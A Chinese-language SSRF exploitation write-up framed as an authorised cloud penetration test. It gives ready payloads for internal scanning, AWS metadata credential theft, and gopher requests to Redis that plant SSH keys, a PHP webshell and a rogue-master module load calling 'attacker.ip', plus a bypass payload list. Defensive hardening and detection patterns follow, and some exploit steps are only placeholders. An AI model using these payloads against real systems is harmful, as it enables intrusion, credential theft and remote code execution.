# SSRF服务端请求伪造利用链实战

## 一、案例背景

### 1.1 目标系统概述

**目标系统**：某云平台内部服务
- **系统地址**：http://cloud.example.com
- **系统类型**：Python Flask + AWS环境
- **测试范围**：授权渗透测试
- **测试时间**：2024年X月X日

### 1.2 测试目标

1. 发现SSRF漏洞
2. 探测内网服务
3. 获取云元数据
4. 利用内网服务漏洞
5. 构造完整攻击链
6. 提供修复方案

### 1.3 测试工具

| 工具名称 | 用途 |
|---------|------|
| Burp Suite | 抓包分析、Payload测试 |
| SSRFmap | SSRF自动化利用 |
| Gopherus | Gopher协议Payload生成 |
| Nmap | 内网服务探测 |

---

## 二、SSRF发现与验证

### 2.1 功能点分析

发现系统存在URL预览功能：

**原始请求**：
```http
POST /api/preview HTTP/1.1
Host: cloud.example.com
Content-Type: application/json

{
    "url": "https://www.google.com"
}
```

**响应**：
```json
{
    "title": "Google",
    "description": "Search the world's information...",
    "image": "https://www.google.com/images/logo.png"
}
```

### 2.2 SSRF验证

#### 2.2.1 请求内网地址

```json
{
    "url": "http://127.0.0.1:80"
}
```

**响应**：
```json
{
    "title": "Internal Dashboard",
    "content": "Welcome to internal service..."
}
```

确认存在SSRF漏洞，可请求内网地址。

#### 2.2.2 请求内部端口

```json
{
    "url": "http://127.0.0.1:6379"
}
```

**响应**：
```json
{
    "error": "Invalid HTTP response"
}
```

虽然返回错误，但说明能连接到Redis端口（6379）。

#### 2.2.3 使用dict协议探测

```json
{
    "url": "dict://127.0.0.1:6379/info"
}
```

**响应**：
```
# Server
redis_version:5.0.7
redis_mode:standalone
os:Linux 4.15.0-76-generic
...
```

确认内网存在Redis服务。

### 2.3 支持的协议探测

| 协议 | 测试Payload | 结果 |
|------|-------------|------|
| http | http://127.0.0.1 | 支持 |
| https | https://127.0.0.1 | 支持 |
| file | file:///etc/passwd | 支持 |
| dict | dict://127.0.0.1:6379/info | 支持 |
| gopher | gopher://127.0.0.1:6379/_*1... | 支持 |

---

## 三、内网探测

### 3.1 网段探测

#### 3.1.1 探测内网网段

```python
# 探测脚本
import requests

for i in range(1, 255):
    url = f"http://192.168.1.{i}:80"
    try:
        resp = requests.post("http://cloud.example.com/api/preview", 
                           json={"url": url}, timeout=3)
        if resp.status_code == 200:
            print(f"[+] {url} - Alive")
    except:
        pass
```

**发现存活主机**：
```
[+] http://192.168.1.10:80 - Alive (内部OA系统)
[+] http://192.168.1.20:80 - Alive (内部Wiki)
[+] http://192.168.1.30:80 - Alive (内部GitLab)
[+] http://192.168.1.100:80 - Alive (内部数据库管理)
```

#### 3.1.2 端口扫描

```python
# 端口扫描
ports = [21, 22, 23, 25, 80, 443, 445, 1433, 3306, 6379, 8080, 8443, 27017]

for port in ports:
    url = f"http://192.168.1.30:{port}"
    try:
        resp = requests.post("http://cloud.example.com/api/preview",
                           json={"url": url}, timeout=3)
        print(f"[+] 192.168.1.30:{port} - Open")
    except:
        pass
```

**发现开放端口**：
```
[+] 192.168.1.30:22 - Open (SSH)
[+] 192.168.1.30:80 - Open (HTTP)
[+] 192.168.1.30:443 - Open (HTTPS)
[+] 192.168.1.30:6379 - Open (Redis)
[+] 192.168.1.30:8080 - Open (HTTP)
```

### 3.2 服务识别

#### 3.2.1 识别Web服务

```json
{
    "url": "http://192.168.1.30:80"
}
```

**响应**：
```html
<!DOCTYPE html>
<html>
<head><title>GitLab</title></head>
<body>
<h1>Welcome to GitLab</h1>
</body>
</html>
```

发现内网GitLab服务。

#### 3.2.2 识别Redis服务

```json
{
    "url": "dict://192.168.1.30:6379/info"
}
```

**响应**：
```
# Server
redis_version:5.0.7
redis_mode:standalone
os:Linux
arch_bits:64
tcp_port:6379

# Clients
connected_clients:1

# Memory
used_memory:834424
```

---

## 四、云元数据获取

### 4.1 AWS元数据

#### 4.1.1 获取元数据

```json
{
    "url": "http://169.254.169.254/latest/meta-data/"
}
```

**响应**：
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
```

#### 4.1.2 获取IAM角色

```json
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**响应**：
```
ecsTaskExecutionRole
```

#### 4.1.3 获取临时凭证

```json
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ecsTaskExecutionRole"
}
```

**响应**：
```json
{
    "Code": "Success",
    "LastUpdated": "2024-01-15T10:30:00Z",
    "Type": "AWS_HMAC",
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalrX...",
    "Token": "FwoGZX...",
    "Expiration": "2024-01-15T16:30:00Z"
}
```

#### 4.1.4 利用临时凭证

```bash
# 配置AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=wJalrX...
export AWS_SESSION_TOKEN=FwoGZX...

# 列出S3存储桶
aws s3 ls

# 下载敏感数据
aws s3 cp s3://company-secrets/credentials.txt ./
```

### 4.2 其他云平台元数据

#### 4.2.1 GCP元数据

```json
{
    "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "headers": {"Metadata-Flavor": "Google"}
}
```

#### 4.2.2 Azure元数据

```json
{
    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "headers": {"Metadata": "true"}
}
```

#### 4.2.3 阿里云元数据

```json
{
    "url": "http://100.100.100.200/latest/meta-data/"
}
```

---

## 五、Redis未授权利用

### 5.1 Redis未授权访问确认

```json
{
    "url": "dict://192.168.1.30:6379/info"
}
```

确认Redis无密码保护，存在未授权访问。

### 5.2 写入SSH公钥

#### 5.2.1 构造Payload

使用Gopherus生成Payload：

```bash
gopherus --exploit redis --sshkey "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali"
```

生成的Gopher Payload：
```
gopher://192.168.1.30:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$4%0d%0aset%0d%0a$1%0d%0ax%0d%0a$380%0d%0assh-rsa AAAAB3NzaC1yc2E... attacker@kali%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### 5.2.2 发送Payload

```json
{
    "url": "gopher://192.168.1.30:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$4%0d%0aset%0d%0a$1%0d%0ax%0d%0a$380%0d%0assh-rsa AAAAB3NzaC1yc2E... attacker@kali%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
}
```

#### 5.2.3 SSH连接

```bash
ssh root@192.168.1.30
# 成功登录
```

### 5.3 写入WebShell

#### 5.3.1 构造Payload

```
gopher://192.168.1.30:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$4%0d%0aset%0d%0a$1%0d%0ax%0d%0a$24%0d%0a<?php eval($_POST[cmd]);?>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### 5.3.2 访问WebShell

```bash
curl -d "cmd=system('id');" http://192.168.1.30/shell.php
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5.4 主从复制RCE

针对Redis 4.x/5.x版本，可利用主从复制执行模块加载：

#### 5.4.1 设置恶意主服务器

```bash
# 在攻击机上启动恶意Redis服务器
python3 redis-rogue-server.py -lport 21000 -exp module.so
```

#### 5.4.2 通过SSRF配置主从

```json
{
    "url": "gopher://192.168.1.30:6379/_*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$13%0d%0aattacker.ip%0d%0a$5%0d%0a21000%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0amodule.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0amodule.so%0d%0a"
}
```

---

## 六、内网服务攻击链

### 6.1 攻击内网GitLab

#### 6.1.1 信息收集

```json
{
    "url": "http://192.168.1.30:80/api/v4/version"
}
```

**响应**：
```json
{
    "version": "13.10.2",
    "revision": "abc123"
}
```

#### 6.1.2 利用已知漏洞

GitLab 13.10.2存在CVE-2021-22205漏洞：

```bash
# 生成利用Payload
python3 gitlab_exploit.py -t http://192.168.1.30:80 -c "id"
```

通过SSRF触发漏洞：
```json
{
    "url": "http://192.168.1.30:80/exploit_trigger"
}
```

### 6.2 攻击内网MySQL

#### 6.2.1 利用Gopher协议

构造MySQL查询Payload：

```python
import struct

def mysql_query(query):
    # 构造MySQL协议包
    query_len = len(query)
    packet = struct.pack('<I', query_len + 1) + bytes([0x03]) + query.encode()
    return packet

# 生成Payload
payload = mysql_query("SELECT '<?php eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'")
```

### 6.3 攻击内网FastCGI

#### 6.3.1 构造FastCGI Payload

```python
import struct

def fastcgi_payload(code):
    # FastCGI协议构造
    payload = ''
    # ... FastCGI协议封装
    return payload

code = "<?php system('id'); ?>"
payload = fastcgi_payload(code)
```

#### 6.3.2 发送Payload

```json
{
    "url": "gopher://192.168.1.30:9000/_" + payload
}
```

### 6.4 完整攻击链

```
1. SSRF漏洞发现
       ↓
2. 内网探测 (发现Redis、GitLab等)
       ↓
3. 云元数据获取 (获取临时凭证)
       ↓
4. Redis未授权利用 (获取WebShell)
       ↓
5. 内网横向移动 (攻击其他服务)
       ↓
6. 获取核心数据
```

---

## 七、防御方案

### 7.1 输入验证

#### 7.1.1 URL白名单验证

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'api.example.com']

def validate_url(url):
    try:
        parsed = urlparse(url)
        
        # 检查协议
        if parsed.scheme not in ['http', 'https']:
            raise ValueError('Invalid scheme')
        
        # 检查域名白名单
        if parsed.netloc not in ALLOWED_DOMAINS:
            raise ValueError('Domain not allowed')
        
        # 检查是否为内网IP
        import socket
        ip = socket.gethostbyname(parsed.netloc)
        if is_private_ip(ip):
            raise ValueError('Private IP not allowed')
        
        return True
    except:
        return False

def is_private_ip(ip):
    # 检查私有IP地址
    private_ranges = [
        ('10.0.0.0', '10.255.255.255'),
        ('172.16.0.0', '172.31.255.255'),
        ('192.168.0.0', '192.168.255.255'),
        ('127.0.0.0', '127.255.255.255'),
        ('169.254.0.0', '169.254.255.255'),
    ]
    # ... IP范围检查逻辑
    return False
```

#### 7.1.2 禁用危险协议

```python
def validate_url(url):
    parsed = urlparse(url)
    
    # 只允许http和https
    if parsed.scheme not in ['http', 'https']:
        raise ValueError('Invalid scheme')
    
    return True
```

### 7.2 网络隔离

#### 7.2.1 使用专用网络

```python
import requests

def safe_request(url):
    # 通过专用代理发送请求
    proxies = {
        'http': 'http://proxy.internal:8080',
        'https': 'http://proxy.internal:8080'
    }
    
    response = requests.get(url, proxies=proxies, timeout=10)
    return response
```

#### 7.2.2 配置防火墙规则

```bash
# 禁止访问元数据地址
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# 禁止访问内网地址
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 127.0.0.0/8 -j DROP
```

### 7.3 云环境加固

#### 7.3.1 禁用IMDSv1

```bash
# AWS EC2强制使用IMDSv2
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

#### 7.3.2 限制IAM权限

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Deny",
            "Action": "*",
            "Resource": "*",
            "Condition": {
                "StringEquals": {
                    "aws:ViaAWSService": "false"
                }
            }
        }
    ]
}
```

### 7.4 服务加固

#### 7.4.1 Redis加固

```bash
# 设置密码
redis-cli CONFIG SET requirepass "strong_password_here"

# 禁用危险命令
redis-cli CONFIG SET rename-command FLUSHALL ""
redis-cli CONFIG SET rename-command CONFIG ""
redis-cli CONFIG SET rename-command EVAL ""

# 绑定本地地址
# redis.conf
bind 127.0.0.1
protected-mode yes
```

#### 7.4.2 禁用不必要的协议

在应用层禁用file://、gopher://、dict://等协议。

### 7.5 监控与告警

```python
def log_ssrf_attempt(url, user_id):
    # 记录SSRF尝试
    log_data = {
        'timestamp': datetime.now(),
        'user_id': user_id,
        'url': url,
        'event': 'SSRF_ATTEMPT'
    }
    
    # 检测可疑模式
    suspicious_patterns = [
        '169.254.169.254',
        'metadata',
        'localhost',
        '127.0.0.1',
        '192.168.',
        '10.',
        '172.16.',
        'file://',
        'gopher://',
        'dict://'
    ]
    
    for pattern in suspicious_patterns:
        if pattern in url:
            log_data['severity'] = 'HIGH'
            send_alert(log_data)
            break
    
    save_log(log_data)
```

---

## 八、完整Payload记录

### 8.1 探测Payload

```
# 基础探测
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://2130706433 (十进制IP)

# 绕过探测
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
```

### 8.2 云元数据Payload

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance
http://169.254.169.254/metadata/identity/oauth2/token

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/
```

### 8.3 Redis Payload

```
# INFO命令
dict://127.0.0.1:6379/info

# 写入文件 (Gopher)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*3%0d%0a$7%0d%0aconfig%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$4%0d%0aset%0d%0a$1%0d%0ax%0d%0a$24%0d%0a<?php eval($_POST[cmd]);?>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 8.4 绕过Payload

```
# URL编码绕过
http://%31%32%37%2e%30%2e%30%2e%31

# 重定向绕过
http://attacker.com/redirect?url=http://127.0.0.1

# DNS重绑定
http://7f000001.ip.cdn77.org

# IPv6格式
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]

# 端口绕过
http://127.0.0.1:8080
http://127.0.0.1:6379
```

---

## 九、总结

### 9.1 SSRF危害等级

| 危害 | 描述 |
|------|------|
| 信息泄露 | 获取内网服务信息、云元数据 |
| 远程命令执行 | 通过Redis、FastCGI等执行命令 |
| 权限提升 | 获取云临时凭证、SSH访问 |
| 横向移动 | 攻击内网其他服务 |

### 9.2 防御优先级

1. **立即实施**：URL白名单验证
2. **立即实施**：禁用危险协议
3. **短期实施**：网络隔离
4. **中期实施**：云环境加固
5. **长期实施**：监控告警

---

> **免责声明**：本文档仅用于授权的安全测试和教育目的。未经授权对他人系统进行渗透测试属于违法行为，请遵守当地法律法规。
